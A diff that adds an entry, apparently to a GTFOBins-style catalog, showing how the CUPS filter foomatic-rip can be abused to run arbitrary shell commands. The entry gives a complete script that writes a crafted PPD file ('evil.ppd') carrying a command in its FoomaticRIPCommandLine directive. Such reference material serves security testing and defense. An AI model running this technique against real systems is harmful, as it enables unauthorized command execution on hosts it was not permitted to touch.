@@ -1,0 +1,44 @@
+---
+functions:
+  shell:
+    - description: |
+        `foomatic-rip` is a CUPS filter that executes commands specified in a PPD file via the `*FoomaticRIPCommandLine` directive. By supplying a custom PPD file through the `PPD` environment variable, an attacker can execute arbitrary system commands.
+      code: |
+        COMMAND='id'
+        TF=$(mktemp -d)
+        printf '%%!PS\nshowpage\n' > "$TF/input.ps"
+        cat > "$TF/evil.ppd" << EOF
+        *PPD-Adobe: "4.3"
+        *FormatVersion: "4.3"
+        *FileVersion: "1.0"
+        *LanguageVersion: English
+        *LanguageEncoding: ISOLatin1
+        *PCFileName: "evil.ppd"
+        *Manufacturer: "Generic"
+        *Product: "(X)"
+        *ModelName: "X"
+        *ShortNickName: "X"
+        *NickName: "X"
+        *PSVersion: "(3010) 0"
+        *LanguageLevel: "3"
+        *ColorDevice: False
+        *DefaultColorSpace: Gray
+        *FileSystem: False
+        *Throughput: "1"
+        *TTRasterizer: Type42
+        *FoomaticRIPCommandLine: "$COMMAND"
+        *OpenUI *PageSize: PickOne
+        *DefaultPageSize: Letter
+        *PageSize Letter/US Letter: "<</PageSize[612 792]>>setpagedevice"
+        *CloseUI: *PageSize
+        *OpenUI *PageRegion: PickOne
+        *DefaultPageRegion: Letter
+        *PageRegion Letter/US Letter: "<</PageSize[612 792]>>setpagedevice"
+        *CloseUI: *PageRegion
+        *DefaultImageableArea: Letter
+        *ImageableArea Letter/US Letter: "0 0 612 792"
+        *DefaultPaperDimension: Letter
+        *PaperDimension Letter/US Letter: "612 792"
+        EOF
+        PPD="$TF/evil.ppd" foomatic-rip 1 user test 1 "" "$TF/input.ps"
+...
